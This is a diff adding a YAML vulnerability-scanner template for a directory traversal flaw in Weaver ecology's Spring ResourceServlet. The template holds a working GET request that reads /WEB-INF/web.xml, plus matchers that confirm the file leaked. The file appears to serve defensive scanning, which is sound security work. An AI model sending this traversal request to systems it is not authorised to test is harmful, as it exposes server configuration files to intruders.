@@ -1,0 +1,25 @@
+id: ecology-springframework-directoryTraversal
+info:
+  name: ecology Spring Framework Directory Traversal
+  author:
+  - l0ne1y
+  description: |-
+    ecology Spring Framework Version Directory Traversal
+    Directory traversal is a security vulnerability caused by insufficient validation of user-supplied file names by the web server or web application. It allows attackers to use special characters to bypass the server's security restrictions, access arbitrary files (including files outside the web root), or even execute system commands. In this vulnerability, attackers can traverse directories to read sensitive files.
+  severity: medium
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - <url-pattern>/weaver/
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml'
+  method: GET
